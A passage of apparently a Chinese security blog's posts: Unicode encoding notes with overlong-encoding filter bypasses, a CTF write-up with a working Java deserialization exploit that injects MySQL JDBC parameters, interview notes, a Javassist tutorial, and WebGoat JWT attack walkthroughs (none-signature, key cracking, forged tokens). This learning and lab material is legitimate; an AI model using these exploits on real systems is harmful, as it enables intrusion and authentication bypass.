的 UTF-8 编码1. 获取 Unicode 码点ord(&#x27;你&#x27;)  # 20320（十进制） → 十六进制 `U+4F60`\n\n2. 确定 UTF-8 编码格式U+4F60 属于 U+0800 ~ U+FFFF 范围 → 3 字节，格式：\n1110xxxx 10xxxxxx 10xxxxxx\n\n3. 将 U+4F60 转换为二进制4F60 (十六进制) → 0100 1111 0110 0000 (二进制)\n\n4. 填充 UTF-8 模板码点二进制：0100 111101 100000填充模板：1110xxxx 10xxxxxx 10xxxxxx结果：1110**0100** 10**111101** 10**100000**\n\n5. 转换为十六进制11100100 → 0xE410111101 → 0xBD10100000 → 0xA0\n\n最终 UTF-8 编码：\\xE4\\xBD\\xA0（3 字节）\nPython 验证&#x27;你&#x27;.encode(&#x27;utf-8&#x27;)  # b&#x27;\\xe4\\xbd\\xa0&#x27;\n\n\nUTF-8 的特点\n兼容 ASCII：U+0000~U+007F 的字符（如 &#39;A&#39;）编码与 ASCII 完全相同（1 字节）。\n无字节序问题：UTF-8 的字节顺序固定，无需 BOM（但某些编辑器可能添加 EF BB BF 作为标记）。\n空间高效：\n\n\n\n英文：1 字节（ASCII 兼容）。\n欧洲字符：2 字节（如 &#39;é&#39;）。\n中文&#x2F;日文：3 字节（如 &#39;你&#39;）。\n生僻字&#x2F;emoji：4 字节（如 &#39;𠀀&#39;）。\n\n\n\nUTF16UTF-16 是一种定长或变长的 Unicode 编码方式，使用 2 或 4 字节 表示一个字符。它的核心特点是：\n\n基本多文种平面（BMP）字符（U+0000 ~ U+FFFF）用 2 字节 直接存储。\n辅助平面字符（U+10000 ~ U+10FFFF）用 4 字节（代理对，Surrogate Pair）存储。\n\n\nUTF-16 的编码规则1. 基本多文种平面（BMP，2 字节）\n范围：U+0000 ~ U+FFFF（不包括代理区 U+D800 ~ U+DFFF）。\n\n直接存储：码点数值直接转为 2 字节。\n\n\n示例：\n\n\n\n\n&#39;A&#39;（U+0041）→ 0x0041（大端：00 41，小端：41 00）\n&#39;你&#39;（U+4F60）→ 0x4F60（大端：4F 60，小端：60 4F）\n\n\n\n\n\n辅助平面这个略看一下就行。\n2. 辅助平面（4 字节，代理对）\n范围：U+10000 ~ U+10FFFF（如 emoji &#39;𠀀&#39; U+20000）。\n代理对计算：\n\n\n\n码点减去 0x10000，得到 20 位中间值。\n高 10 位 + 0xD800 → 高位代理（High Surrogate）。\n低 10 位 + 0xDC00 → 低位代理（Low Surrogate）。\n\n\n\n\n\n示例：\n\n\n\n# 计算 &#x27;𠀀&#x27;（U+20000）的 UTF-16 代理对code_point = 0x20000temp = code_point - 0x10000  # 0x10000high_surrogate = (temp &gt;&gt; 10) + 0xD800  # 0xD840low_surrogate = (temp &amp; 0x3FF) + 0xDC00  # 0xDC00# 最终代理对：0xD840 0xDC00\n\n\n字节序（大端 vs 小端）UTF-16 的 2 字节或 4 字节序列需要明确字节序：\n\n大端（BE）：高位字节在前（如 0x4F60 → 4F 60）。\n\n小端（LE）：低位字节在前（如 0x4F60 → 60 4F）。\n\nBOM（字节顺序标记）：\n\n\n0xFEFF（大端 BOM，存储为 FE FF）。\n0xFFFE（小端 BOM，存储为 FF FE）。\n\n\n\n\nPython 示例这里遇到过一个坑，python如果只指定utf16，输出是带BOM的，当时不知道，一直想不明白为什么会输出四个字节。\n# 默认 UTF-16（带 BOM，小端）print(&#x27;你&#x27;.encode(&#x27;utf-16&#x27;))  # b&#x27;\\xff\\xfe\\x60\\x4f&#x27;（BOM + 小端）# 显式指定大端（无 BOM）print(&#x27;你&#x27;.encode(&#x27;utf-16be&#x27;))  # b&#x27;\\x4f\\x60&#x27;# 显式指定小端（无 BOM）print(&#x27;你&#x27;.encode(&#x27;utf-16le&#x27;))  # b&#x27;\\x60\\x4f&#x27;# 辅助平面字符 &#x27;𠀀&#x27;（U+20000）print(&#x27;𠀀&#x27;.encode(&#x27;utf-16be&#x27;))  # b&#x27;\\xd8\\x40\\xdc\\x00&#x27;（代理对）\n\n\nUTF-16 的特点\n定长与变长混合：\n\n\n\nBMP 字符：2 字节。\n辅助平面字符：4 字节（代理对）。\n\n\n\n\n字节序敏感：需明确大端或小端（或依赖 BOM）。\n适用场景：\n\n\n\nWindows 系统内部（如 wchar_t）。\nJava&#x2F;C# 的字符串内存表示。\n\n\n\nUTF-8 vs. UTF-16\n\n\n特性\nUTF-8\nUTF-16\n\n\n\n最小字节数\n1（ASCII）\n2（基本字符）\n\n\n最大字节数\n4\n4（代理对）\n\n\n字节序\n无（单字节存储）\n需考虑大端&#x2F;小端（BOM）\n\n\n适用场景\n互联网、文本文件、数据库\n操作系统内部（如 Windows&#x2F;Java）\n\n\n\n总结所有字符的Unicode码点是唯一的，可以通过hex(ord(str))的方式得到16进制格式的码点。根据得到的码点，套用不同的编码方式，就可以得到不同编码下的字符。\n高位丢失情况先看一个例子\npackage solution;public class tmp &#123;    public static void main(String[] args) &#123;        StringBuffer stringBuffer = new StringBuffer();        stringBuffer.append(&quot;你&quot;);        char c = stringBuffer.charAt(0);        System.out.println(&quot;字符转十进制整数（Unicode码点的整数形式）：&quot;+(int) c);        String format = String.format(&quot;dec转hex：%04x&quot;,(int) c);        System.out.println(format);        byte c1 = (byte) c;        System.out.println(&quot;转成byte类型（高位丢失,4f60剩60,60转dec就是96）：&quot;+c1);        System.out.println((char) c1);        byte i = 127;   //byte的范围是-128——127，用的补码表示法    &#125;&#125;\n\n输出结果：\n字符转十进制整数（Unicode码点的整数形式）：20320dec转hex：4f60转成byte类型（高位丢失,4f60剩60,60转dec就是96）：96`\n\n\n\n这里很好地展示了高位丢失的情况。因为byte只有八个字节，而char有16个字节（char 在Java中本质上是一个16位的Unicode字符）。\n这个性质有时候可以用来绕过一些过滤。比如D^3CTF25的d3jtar那题。\nD3CTF-d3jtar | 1diot9’s Blog\nUTF8 Overlong Encoding根据前面学习过的UTF8编码，我们知道，’A’对应的码点是41，转换成二进制就是0010 0001，然后根据0xxxxxxx的方式补位，得到的utf8编码就是0010 0001，转换成16进制就是 41。但是，我们可以在码点前面补零，将A的码点变成0000 0010 0001，然后根据110xxxxx 10xxxxxx补成两个字节。即11000000 10100001\n转成16进制就是C0A1\n这样就得到了’A’的UTF8 Overlong Encoding形式。\n如果没有对UTF8编码进行校验的话，就可以尝试通过这种方法绕过，比如Java的原生反序列化。\n参考UTF-8 Overlong Encoding导致的安全问题 | 离别歌\n","categories":["其他知识"],"tags":["Java","其他知识","Python"]},{"title":"羊城杯2020-a_piece_of_java","url":"/2025/06/19/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-a-piece-of-java/","content":"知识点动态代理触发实体类的危险方法+jdbc mysql反序列化\n解题过程先看一下Controller里面的代码：\n整体的逻辑还是比较简单的，就是在index传入username和password，然后把这些数据封装到UserInfo对象，并存储到Cookie作为登录凭证。当我们访问hello的时候，Cookie中的数据会被deserialize，我们的username和pasword也就出来了。\n那么应该可以想到这么一些东西：deserialize的数据在cookie里，而cookie的数据我们可控，即我们可以操纵反序列化的数据\n上面的东西是题目的一环，不过条件还没用完，我们去看看其他文件，能够发现DatabaseInfo里面有数据库连接的行为：\nconnect()里面的密码是直接拼接的，意味着我们可以在后面添加任意参数。然后这个checkAllInfo又调用了connect()。那怎么样才能触发这个checkAllInfo呢？这个就要用到我们的最后一个条件，动态代理。\n去看看这个动态代理：\n很明显，这个invoke里面是有checkAllInfo的，而且只要调用被动态代理类的方法，这个invoke就肯定会被调用。那整条链子就出来了，先直接看EXP：\npackage gdufs.challenge.web;import gdufs.challenge.web.invocation.InfoInvocationHandler;import gdufs.challenge.web.model.DatabaseInfo;import gdufs.challenge.web.model.Info;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Proxy;import java.util.Base64;public class EXP &#123;    public static void main(String[] args) throws IOException &#123;        DatabaseInfo databaseInfo = new DatabaseInfo();        databaseInfo.setHost(&quot;127.0.0.1&quot;);        databaseInfo.setPort(&quot;3309&quot;);        databaseInfo.setPassword(&quot;123456&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;);        databaseInfo.setUsername(&quot;root&quot;);        InfoInvocationHandler infoInvocationHandler = new InfoInvocationHandler(databaseInfo);        Info info=(Info) Proxy.newProxyInstance(databaseInfo.getClass().getClassLoader(),databaseInfo.getClass().getInterfaces(), infoInvocationHandler);        byte[] bytes = serializeBytes(info);        System.out.println(Base64.getEncoder().encodeToString(bytes));    &#125;    public static  byte[] serializeBytes(Object object) throws IOException &#123;        ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(object);        return byteArrayOutputStream.toByteArray();    &#125;&#125;\n\n我这里正向整理一遍：deserialize后得到我们设置的DatabaseInfo的动态代理，赋值给info；info.getAllInfo()触发动态代理里面的invoke()；invoke里面的checkAllInfo()触发DatabaseInfo里面的connect()。从而触发漏洞。\n接下来只要用python在3309端口开一个fake mysql的服务，然后返回恶意的序列化数据就可以了，就是之前学的mysql jdbc反序列化里面的内容。\n","categories":["CTF-Java"],"tags":["CTF-Java"]},{"title":"2025暑期面试汇总","url":"/2025/06/19/2025%E6%9A%91%E6%9C%9F%E9%9D%A2%E8%AF%95%E6%B1%87%E6%80%BB/","content":"深信服一面–安全攻防实习生讲了半个小时，反正不会的稍微讲讲，会的往详细讲。\n1、自我介绍\n2、sql注入了解吗？DNS外带注入知道吗？SQL提权了解吗\n把几种注入方式都讲了一遍，绕过的方法也讲了一遍。\nDNS外带不清楚，好像只能windows用，对版本也有要求。\n提权只知道UDF，没多讲，不会。\n3、XSS有哪几类\n不怎么熟悉，反射，存储，DOM\n4、SSRF知道吗？绕过方式呢？\n常规讲。\n5、Redis的攻击面\n不知道，只知道有个定时任务相关的。后面说这个是CTF考的比较多才问，我说我现在主要学习Java安全相关的，就把话题引入Java了。\n6、Java安全相关\n库库一顿讲。CC链，fastjson各版本绕过，JNDI+JDBC连打。反正说了很多，也讲的比较详细。\n7、有没有挖到过Java相关的漏洞\n没有，太难了。讲了目前还是以复现为主。于是开始讲之后的安排：先代码审计，熟悉基本漏洞并实现自动化挖掘；然后再挖开源系统漏洞，顺带分析了一下难点和大概思路。\n8、给你一个流量包，能分析出里面的恶意流量，并推导出0day的Poc吗\n不会，反问环节了解到，这是公司内部在做的事。\n9、都是自学的吗？一般怎么学习？\n是。看github学习路线+博客。\n10、反问环节\n实习要做什么？GO用的多吗？有没有住房补贴交通补贴？二面什么时候？\n知道创宇–安全研究实习生主要是基于自我介绍和简历提问，追问很多。\n\n自我介绍\n问了对实习时间的安排\n学校学习的课程内容\nCTF比赛经历\nWeb基础漏洞有哪些(我以php展开讲)？延时盲注等的构造思路。文件上传学了什么？\nphp反序列化和Java反序列化的异同\nJava中的Web基础漏洞了解吗？Java的Web开发框架用过吗？\nfastjson各版本漏洞原理+修复；fastjson结合原生反序列化\n不能出网的话，反序列化怎么利用？只能写文件呢，不出网怎么利用？\ntabby和codeql学到什么程度了，能简单讲一下吗？\n打CTF的时候，有用python写过POC吗\nJava序列化的数据结构了解吗？ （学过，但是忘了，悲）\nJDBC能实现RCE的原理了解吗？\n平时有写过小项目或者小脚本之类的吗？  （得赶紧复刻一个ysoserial了）\n有没有不在简历上的，比较有优势的地方，描述一下\nCTF或者写代码，有和队员合作交流的经历吗\t（其实可以把在github合作完成大作业的经历讲）\n自己github学习项目的介绍\nsqlite攻击的原理，为什么加载.so文件能实现RCE  （个人博客上的内容）\nSpringBoot 内存马注入原理\n大概一周内有结果\n\n绿盟一面–安全研究员\n自我介绍\n问了上课忙不忙，其实就是问能不能保证实习时间\n大学课程里和安全相关的课；排名情况\nCTF有参加过什么比赛吗\n为什么会选择做Java安全这块\nCC链讲一下\t（挑了CC6讲）\n高版本jdk 怎么绕过 TemplatesImpl没法使用的情况。就是jdk17一般怎么打。\n内存马常见注入方式有哪些\n拿到Java服务器的RCE，怎么去做持久化\n文件上传，RCE相关漏洞的验证poc写的多吗\n有参加过学校组织的护网等偏实战的项目吗\n平时python用的多不多。CTF-Web 是不是python用的比较多\n有没有其他项目经历\n讲了公司的一些业务 （星宇实验室，云安全，云原生，组件poc验证，poc集成到扫描器）。问是否感兴趣。说明工作量可能比较大，问到岗时间。\n对go语言有了解吗\n反问环节\n\n奇安信–安全研究问题都是偏实战化的，追问很多，让我知道了很多自己的不足。\n\n自我介绍\n内存马有哪些了解\n发现了一个命令执行的漏洞，怎么去注内存马？\n\n不知道，说是用agent技术动态attach\n\n哪些内存马是tomcat里特有的\n\n一个post接口，存在Java原生反序列化漏洞，怎么利用？\n\n\n怎么去找里面有哪些依赖？\n怎么发一个payload，把常见的依赖全探测出来？\n\n\n确定有CB链，但是打不通，可能是什么原因？\n\n\n回答的都是WAF相关的，但是实际想让你回答不同版本依赖SerializeUID不同，会导致反序列化失败。\n\nhessian反序列化了解吗？hessian-only-jdk的链子讲一下？MimeTypeParameterList链对调用的方法有没有什么限制？\n\n限制public方法，参数类型也有限制。\n\nJava反序列化 bypass waf 有什么方法吗\n\n二次反序列化，UTF8Overlong，JNI\n\nshiro反序列化了解吗？\nnginx环境下，shiro cookie头过长怎么解决？\n\n支持POST，可以从body里拿；分段发送；\n我还说了写webshell，于是问了下面的问题：要是不知道网站目录，怎么写shell？\n\n有尝试自己去挖利用链吗？讲一下最近分析出来的比较有趣的链。\n.NET 方面的漏洞有了解吗？\n有自己去审计过一些系统吗？开源的，闭源的都行。\n有挖过逻辑漏洞吗？\n觉得自己的开发能力怎么样？ 有试过写一下利用链工具之类的吗？\n网上开源的webshell工具有哪些可以改进的地方？\n反问环节\n\n杭州默安科技最后反问的时候知道，工作内容主要是各种设备的开发，包括RASP，IASP，AI动态检测等，感觉比较先进。\n\n自我介绍\n讲一下 Java 原生反序列化的原理\n讲一下知道的一些利用链\n讲一下fastjson反序列化和原生反序列化的不同？里面常用的链子有哪些\n反序列化可以造成什么危害？\n怎么自动化地挖掘新链？\nJNDI知道吗，讲一下？\n内存马知道吗，讲一下？\n怎么动态检测内存马？怎么做内存马攻防？\nJava开发有做过吗？\n反问环节\n\n微步在线-安全实习生（漏洞研究）工作内容：做应急响应，负责维护公司的漏洞库，主要是做各种漏洞的分析，有师傅直接带你\n根据简历问的，也有适当的追问。\n\n他先自我介绍了一下，介绍了工作职责\n自我介绍\nCTF比赛中有拿到过名次吗？\n有没有加入什么联合战队\n讲一下简历上写的，高版本fastjson在原生反序列化中的使用（就是toString–&gt;getter那个）\nLdapAttribute链知道吗？\nJNDI和JDBC Attack结合的打法知道吗？\n\n我讲了JNDI + JDBC 的组合打法，就是 getObjectInstance 的那个。\n\n不同JDBC有不同的绕过，能讲一下mysql JDBC 的一些绕过技巧吗？比如URL编码之类的。\nJDBC里，除了有个SocketFactory打法，还有一个什么函数？\n\n后面说是有一个SSLSocketFactory，没听说过。\n\nldap，如果 trustcodebase 为 false，还有哪两种利用方法？\nreadObject–&gt;toString–&gt;getter–&gt;JDBC的打法知道吗？BadAttribute的链子被ban了，还有别的readObject–&gt;toString的链吗？\n除了fastjson和JDBC、JNDI的漏洞，还有别的熟悉的组件的漏洞吗？\n\n讲了shiro\n\nshiro中，用来判断 key 是否正确的两个核心类是什么？\n\nSimplePrivilegeCollection\n\n有自己写过内存马吗？不用工具生成的。\n了解过Agent吗？Rasp知道吗？\n简历上写自己能独立分析1day，能说一下吗？\n\n其实还不是很会，被拷打了，悲\n\n前一段时间，有个议题，讲了Apache Inlong 的绕过，有看吗？\n\nhttps://github.com/yulate/jdbc-tricks/blob/main/real-world-case/README.md\n可惜没来得及看。\n\n平时有写过一些POC工具吗\n\n又被拷打了，简历上不该吹牛的。放假后得赶快把小工具写起来。\n\n静态分析工具，Tabby，CodeQL用过吗\n\n反问环节\n\n长亭科技–安全研究工程师\n自我介绍\n学校是有人带还是一个人学？\n平时的学习方法，一天的学习规划\n安全开发主要用什么语言，java那里二开过什么工具\n比较擅长的漏洞类型有哪些\n简单讲一下CB链的优化方式，CB链的原理，CB链默认需要依赖CC组件吗；CC链的TransformerInvoker；CC链里toString为入口的链子；还有别的以toString为入口的链子吗\n黑盒场景，可以反序列化请求体，怎么探测可利用的gadgets；说一下DNS探测的原理；不报错，但是能探测\nfastjson利用链的注意点；有注意过一个随机的问题吗（应该指的是POJONode的那条链子）\n还是黑盒gadgets探测，但是不出网，也没有回显，怎么探测？（其实直接sleep一下就行，当时没想到）\n\n我一开始讲直接打内存马，但是反问我如果不知道远程是什么中间件\n\n讲一下文件上传的漏洞；图片马怎么生成，二次渲染绕过\n有了解过commons-upload组件吗\n\n没了解过，之后记得看\n\nJava的JDBC，JNDI利用有了解吗；常见JDBC及利用方式；有了解过postgreSQL的JDBC吗，p神师傅写过关于这个的文章，有看过吗（没看过，惭愧了，现在还是太功利，太着急，感觉比赛里不常考的就不想学）\nmysql JDBC不出网，怎么把pcap文件上传进去；ascii jar方法了解吗\n\nascii jar是p神师傅文章里的非预期解https://www.leavesongs.com/PENETRATION/springboot-xml-beans-exploit-without-network.html  是结合postgre写文件的一种方法\n\n讲一下SSRF形成原理，黑盒怎么测；常见绕过技巧；URL跳转绕过有了解吗(没了解，记得看)\nJava中的绕过trick知道吗；比如ban了http协议（其实是问你别的协议，比如file协议除了写文件还能干嘛）；file协议能列目录吗，能相对目录读文件吗；netdoc协议知道吗（其实这里在问SSRF的代码审计了，可惜还没接触过）\n有Java代码审计基础吗，php的呢；web框架的基础不是特别好是吗\n有了解过web安全是做什么的吗，为什么想投这个岗位呢；能实习多久呢\n反问环节\n\n工作内容：需要有代码审计基础，复现一些最新的漏洞，基于commit；做一些应急；打ctf和漏洞挖掘比赛；漏洞利用，waf绕过\n总结最后阴差阳错的去绿盟的安全服务，那个面试没记录，因为当时觉得大概率不会进，因为毕竟是想去安全研究岗。没想到就那个安全服务岗过了，过的还特别快，面试到offer就3个小时左右。\n经过这么多面试，知道了很多自己的不足，也大致了解到安全研究岗的要求。说实话，一个安全研究的offer都没拿到还是有点失落的。\n后面需要把代码审计，工具二开搞好，再后面要尝试自己找系统审计，或者分析1day，或者利用链挖掘。总之，不能再急于求成了，需要静下心来学习。\n\n\n","categories":["面试"],"tags":["面试","实习"]},{"title":"Javassist初见","url":"/2025/07/11/Javassist%E5%88%9D%E8%A7%81/","content":"前言在写序列化数据生成工具时，TemplatesImpl里的bytes[][]往往都是由javassist动态生成的。javassist依赖相较于asm依赖，使用起来更加简单，因为javassist更像是在操作类，而asm就是在操作字节码了。这里介绍一下javassist的基本用法，另外自己在使用javassist时，遇到了不少坑，这里也来总结一下。\n基本使用直接看代码，我写注释了：\npackage com.idiot9;import javassist.*;public class CreateMyTest &#123;    public String address;    public CreateMyTest() &#123;        System.out.println(&quot;ctConstrutor&quot;);    &#125;    public static void main(String[] args) throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        CtClass MyTest = pool.makeClass(&quot;MyTest&quot;);        //添加字段        CtField name = new CtField(pool.get(&quot;java.lang.String&quot;), &quot;name&quot;, MyTest);        name.setModifiers(Modifier.PRIVATE);        MyTest.addField(name, CtField.Initializer.constant(&quot;1diot9&quot;));        CtField address = CtField.make(&quot;public String address;&quot;, MyTest);        MyTest.addField(address);        //添加构造方法        CtConstructor ctConstructor = new CtConstructor(new CtClass[]&#123;&#125;, MyTest);        ctConstructor.setBody(&quot;System.out.println(\\&quot;ctConstrutor\\&quot;);&quot;);        MyTest.addConstructor(ctConstructor);        //添加方法        CtMethod hello = new CtMethod(CtClass.voidType, &quot;hello&quot;, new CtClass[]&#123;&#125;, MyTest);        hello.setModifiers(Modifier.PUBLIC);        hello.setBody(&quot;System.out.println(\\&quot;hello\\&quot; + name);&quot;);        MyTest.addMethod(hello);        CtMethod tmp = CtMethod.make(&quot;    public void tmp()&#123;\\n&quot; +                &quot;        System.out.println(\\&quot;tmp\\&quot;);\\n&quot; +                &quot;    &#125;&quot;, MyTest);        MyTest.addMethod(tmp);        //添加静态代码块        CtConstructor staticBlock = MyTest.makeClassInitializer();        staticBlock.setBody(&quot;System.out.println(\\&quot;staticBlock\\&quot;);&quot;);        String s = &quot;System.out.println(\\&quot;staticBlock2\\&quot;);&quot;;        MyTest.makeClassInitializer().insertAfter(s);        //添加父类        CtClass superClass = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);        MyTest.setSuperclass(superClass);        //输出字节码        MyTest.writeFile(&quot;./src/main/java/&quot;);    &#125;    public void tmp()&#123;        System.out.println(&quot;tmp&quot;);    &#125;&#125;\n\n这里介绍了几种常用的方法：创建字段，创建方法，创建构造方法，创建静态代码块，继承父类\n类搜索相关javassist必须要找到对应的类才能进行动态创建，所以搞清楚它的默认搜索路径和怎么添加路径很重要。下面来简单介绍一下。\n首先，会加载rt.jar中的核心包，包括：java.lang包的所有类，java.util，java.net，java.math，java.nio，java.swing，java.awt，java.lang.reflect，java.lang.invoke。注意，这上面的都是加载单个包下的类，不包括子包里的内，这一点很重要。\n然后介绍一下第三方依赖的搜索情况。\n如果你在pom里导入了依赖，那么你可以通过 pool.get(“org.apache.commons.beanutils.BeanComparator”); 的方式直接获取到类。但是，如果你没有在pom里导入依赖，就需要手动添加类搜索路径，比如添加一个jar包路径：pool.insertClassPath(“D:\\repository\\commons-beanutils\\commons-beanutils\\1.9.4\\commons-beanutils-1.9.4.jar”); 这样javassist就能找到这个包中的所有类。\n除了在get类的时候有搜索问题，在动态创建方法时也会有问题。首先看一下下面的代码：\npublic class CreateOutPackage &#123;    public static void main(String[] args) throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        //insertClassPath影响类搜索范围，pom里导入的依赖，默认在搜索范围        pool.insertClassPath(&quot;D:\\\\repository\\\\commons-beanutils\\\\commons-beanutils\\\\1.9.4\\\\commons-beanutils-1.9.4.jar&quot;);                CtClass ctClass = pool.makeClass(&quot;Test&quot;);        String staticBlock = &quot;BeanComparator beanComparator = new BeanComparator();&quot;;        ctClass.makeClassInitializer().insertAfter(staticBlock);    &#125;&#125;\n\n是不是觉得没有任何问题？但是运行后会发现报错：\n报错原因为：找不到BeanComparator类。这里你可能会想，上面不都insertClassPath了吗，为什么还找不到呢？这是因为，我们没有写全限定名。举个例子，存在两个同名类，com.A和net.A，那么，如果你只写A，javassist怎么知道是哪一个呢？所以我们修改代码如下：\npublic class CreateOutPackage &#123;    public static void main(String[] args) throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        //insertClassPath影响类搜索范围，pom里导入的依赖，默认在搜索范围        pool.insertClassPath(&quot;D:\\\\repository\\\\commons-beanutils\\\\commons-beanutils\\\\1.9.4\\\\commons-beanutils-1.9.4.jar&quot;);        ctClass = pool.makeClass(&quot;Test&quot;);        String staticBlock = &quot;org.apache.commons.beanutils.BeanComparator beanComparator = new org.apache.commons.beanutils.BeanComparator();&quot;;        ctClass.makeClassInitializer().insertAfter(staticBlock);    &#125;&#125;\n\n这样一来就没有报错了。\n不过，每次都要写全限定名是不是觉得很麻烦？所以，javassist还提供了另外一个方法：pool.importPackage(“org.apache.commons.beanutils”); 这个的效果就相当于每次在类最顶上进行import，回忆一下，当我们import后，是不是只需要写SimpleName就行了？这里importPackage的效果是一样的。\n于是，我们可以再修改代码如下：\npublic class CreateOutPackage &#123;    public static void main(String[] args) throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        //insertClassPath影响类搜索范围，pom里导入的依赖，默认在搜索范围        pool.insertClassPath(&quot;D:\\\\repository\\\\commons-beanutils\\\\commons-beanutils\\\\1.9.4\\\\commons-beanutils-1.9.4.jar&quot;);        //importPackage影响代码写法，是写全限定名还是写SimpleName        pool.importPackage(&quot;org.apache.commons.beanutils&quot;);        CtClass ctClass = pool.makeClass(&quot;Test&quot;);        String staticBlock = &quot;BeanComparator beanComparator = new BeanComparator();&quot;;        ctClass.makeClassInitializer().insertAfter(staticBlock);    &#125;&#125;\n\n这样看起来是不是简洁很多？\n遇到的坑在写SpringInterceptor内存马时，遇到一个很奇怪的点。我定义了一个command方法，并在preHandle方法中调用：\n但是这样会报错：\n当我把最底下的command方法删除后就行了。我一开始以为是command方法的问题，但是后来发现直接照搬方法体到preHandle里竟然可以，于是也不是command方法的问题。\n后来不知怎么灵机一动，把command调用上面的String command改成了String cmd，就好了：\n原来这里同一个类里的变量名和方法名不能一样。\n参考https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/#Javassist\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"WebGoat靶场-身份认证缺陷","url":"/2025/07/22/WebGoat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/","content":"前言简单的部分就一笔带过了。虽然有些是之前学过的，但这里从代码审计的角度再看一遍，加深印象。现在还在想一个问题，是边写边做笔记，还是写完再做笔记更好？这里先选择边写边做试试。\n二因素认证绕过抓包后找到对应的方法，直接看源码：\n要success，先要不进入上面的if，然后进入下面的if。\n先看上面if的判断。\npaseSecQuestions是只留下含有secQuestion的POST参数，即留下安全问题的答案，具体方法如下：\n默认的secQuestion参数是secQuestion0和secQuestion1，我们可以改成任意包含secQuestion的参数。\n然后跟进didUserLikelylCheat方法，具体代码：\n我们需要返回false，这里让secQuestion参数不是secQuestion0和secQuestion1就行，我这里改成secQuestionA和secQuestionB。理论上这里直接去掉这两个参数都行，但是这样后面会出问题。\n接着看第二个if，即verifyAccount方法：\n这里解释了为什么不能把secQuestion参数删除，删了就过不了这里的第一个if了。下面两个if由于我们把secQuestion改成了secQuestionA&amp;secQuestionB，所以不用知道安全问题的答案也能通过。\n最终报文：\n明文传输这个很简单，就是抓包后得到的是明文，这样被嗅探的话就很危险。具体不演示了，抓包就行。\nJWTjwt解码这个很简单，直接base64解码就行，推荐用jwt.io这个网站：\n空签名绕过这关需要以admin身份去reset。点击任意一个vote按钮，都提示我们是guest，需要先登录：\n看一下cookie，发现虽然有token，但是是空的：\n但是这里又没有login的登录框，所以去看源码吧。\n能够发现有一个login方法：\nif判断需要我们传入一个特定的user，不然就会进入else，返回一个空的token。这个特定的user是硬编码，在上面找到：\n同时55行也给了jwt的key，先有个印象。\n访问&#x2F;login后，即可获得token：\n后来才知道，TomJerrySylvester原来是三个用户，不过不影响：\n\n接下来切换到tom，解码他的token：\n这里可以用none加密绕过，原因在resetVotes方法里。首先，为什么直接去看resetVotes方法？因为我们的目标就是reset，所以优先找最接近的方法。下面是具体代码：\n注意这个parse，这个parse是不会验证用户提供的token签名是否与真实的token签名一致，因此签名的作用形同虚设，可以直接通过none绕过，具体如下：直接把签名算法部分改成none，然后在下面直接修改payload部分即可。最后更改token，再次reset就行了。\n那么，验证签名的jwt解析代码怎么写？其实很简单，把parse方法改成parseClaimsJws即可：\njwt密钥暴力破解当使用弱密码时，我们可以尝试暴力破解或字典破解jwt的key，这里推荐使用jwt_tool：https://github.com/ticarpi/jwt_tool\n成功找到victory就是密钥：\n另外，查看源码可以发现一共有5个key，每次会随机一个，而且实际上的JWT_SECRET是单词进行base64编码的：\n\n本来还是想用jwt.io，但是那边说key太短，没法加密：\n所以写个脚本加密，直接照搬题目的加密逻辑就行了：\n过期token重放这个的重点也在拿到key，没key是改不了的。\n还是先简单做一下黑盒测试，对这个关卡抓包，可以发现：\n这个就是给我们发放token的过程，去看对应代码：\n过程很简单，就是根据我们的user和password发token。这里的token有两个：1、普通的token，有iat(签发时间)、admin、user、算法是HS512   2、refreshtoken，随机产生的    这两个token最后都存入一个叫tokenJson的HashMap里。\n接着看重点，即过关条件的代码：\n有两种过关方式，两者的共同条件都是JWT中的user&#x3D;Tom\n1、空签名：这个很简单，alg改成none，然后直接修改即可\n\n2、过期token重放：这个需要先去找到tom之前的token，靶场给我们提供了：\n找到tom之前的token后解码，发现token2018年就过期了：\n\n现在的目标就是找出key，然后改时间。key硬编码在源码中，所以写个脚本重新生成JWT就行，注意算法是HS512，这个卡了我好久：\npackage tmp;import io.jsonwebtoken.Jwts;import io.jsonwebtoken.SignatureAlgorithm;import java.time.Instant;import java.util.Calendar;import java.util.Date;public class jtw &#123;    private static final String JWT_SECRET = &quot;bm5n3SkxCX4kKRy4&quot;;    public static String getSecretToken() &#123;        return Jwts.builder()                .setIssuedAt(Calendar.getInstance().getTime())                .setExpiration(Date.from(Instant.now().plusSeconds(600)))                .claim(&quot;user&quot;, &quot;Tom&quot;)                .claim(&quot;admin&quot;, &quot;false&quot;)                .signWith(SignatureAlgorithm.HS512, JWT_SECRET)                .compact();    &#125;    public static void main(String[] args) &#123;        String secretToken = getSecretToken();        System.out.println(secretToken);    &#125;&#125;\n\n然后在请求体中替换token即可。\njku伪造简单理解： JWT 的 jku 字段可以指向一个远程 URL，表示验证 token 时应从该 URL 下载公钥。攻击者可以伪造这个 URL 指向自己控制的服务器，从而用自己的私钥签发伪造的 token，并通过验证。 \n首先，还是抓包delete请求，看看token：\n目标很明确，生成自己的RSA256密钥对，将jku指向自己的公钥存放URL，修改username为Tom后用自己的私钥签名。\n先让ai写一段脚本生成密钥：\nfrom cryptography.hazmat.primitives.asymmetric import rsafrom cryptography.hazmat.primitives import serialization# 生成私钥private_key = rsa.generate_private_key(    public_exponent=65537,    key_size=2048)# 导出私钥 PEMprivate_pem = private_key.private_bytes(    encoding=serialization.Encoding.PEM,    format=serialization.PrivateFormat.PKCS8,    encryption_algorithm=serialization.NoEncryption())# 生成公钥public_key = private_key.public_key()# 导出公钥 PEMpublic_pem = public_key.public_bytes(    encoding=serialization.Encoding.PEM,    format=serialization.PublicFormat.SubjectPublicKeyInfo)# 写入文件with 